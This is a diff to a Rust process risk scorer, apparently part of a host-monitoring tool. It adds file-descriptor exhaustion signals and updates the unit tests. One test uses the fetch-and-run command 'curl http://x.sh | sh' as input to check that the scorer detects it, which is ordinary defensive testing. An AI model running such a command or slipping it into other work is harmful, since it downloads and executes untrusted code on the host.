@@ -16,7 +16,7 @@ pub struct Risk {
     pub signals: Vec<String>,
 }
 
-pub fn assess(p: &Process, sockets: &[Socket]) -> Risk {
+pub fn assess(p: &Process, sockets: &[Socket], fd_usage: Option<(u64, u64)>) -> Risk {
     let mut score: u32 = 0;
     let mut signals: Vec<String> = Vec::new();
     let add = |weight: u32, msg: String, score: &mut u32, signals: &mut Vec<String>| {
@@ -70,6 +70,25 @@ pub fn assess(p: &Process, sockets: &[Socket]) -> Risk {
             &mut score,
             &mut signals,
         );
+    }
+    if let Some((used, limit)) = fd_usage {
+        if let Some(pct) = (used * 100).checked_div(limit) {
+            if pct >= 80 {
+                add(
+                    2,
+                    format!("fd table nearly exhausted ({used}/{limit} open, {pct}%)"),
+                    &mut score,
+                    &mut signals,
+                );
+            } else if pct >= 50 {
+                add(
+                    1,
+                    format!("fd usage {used}/{limit} ({pct}%)"),
+                    &mut score,
+                    &mut signals,
+                );
+            }
+        }
     }
 
     Risk {
@@ -151,7 +170,7 @@ mod tests {
 
     #[test]
     fn temp_and_deleted_score() {
-        let r = assess(&proc_with(Some("/tmp/evil", ), "/tmp/evil", true), &[]);
+        let r = assess(&proc_with(Some("/tmp/evil", ), "/tmp/evil", true), &[], None);
         assert_eq!(r.score, 6);
         assert_eq!(r.signals.len(), 2);
         assert!(r.signals.iter().any(|s| s.contains("temp")));
@@ -159,12 +178,28 @@ mod tests {
 
     #[test]
     fn curl_pipe_shell_detected() {
-        let r = assess(&proc_with(None, "curl http://x.sh | sh", false), &[]);
+        let r = assess(&proc_with(None, "curl http://x.sh | sh", false), &[], None);
         assert!(r.signals.iter().any(|s| s.contains("pipes")));
         assert_eq!(r.score, 4);
         // ordinary pipelines don't trigger
-        let ok = assess(&proc_with(None, "cat a | grep b", false), &[]);
+        let ok = assess(&proc_with(None, "cat a | grep b", false), &[], None);
         assert_eq!(ok.score, 0);
+    }
+
+    #[test]
+    fn fd_usage_thresholds() {
+        // >=80%: strong signal (weight 2)
+        let hot = assess(&proc_with(None, "x", false), &[], Some((90, 100)));
+        assert_eq!(hot.score, 2);
+        assert!(hot.signals.iter().any(|s| s.contains("nearly exhausted")));
+        // 50-79%: context signal (weight 1)
+        let warm = assess(&proc_with(None, "x", false), &[], Some((55, 100)));
+        assert_eq!(warm.score, 1);
+        // <50% or unreadable limit: silent
+        let cool = assess(&proc_with(None, "x", false), &[], Some((10, 100)));
+        assert_eq!(cool.score, 0);
+        let none = assess(&proc_with(None, "x", false), &[], Some((90, 0)));
+        assert_eq!(none.score, 0);
     }
 
     #[test]
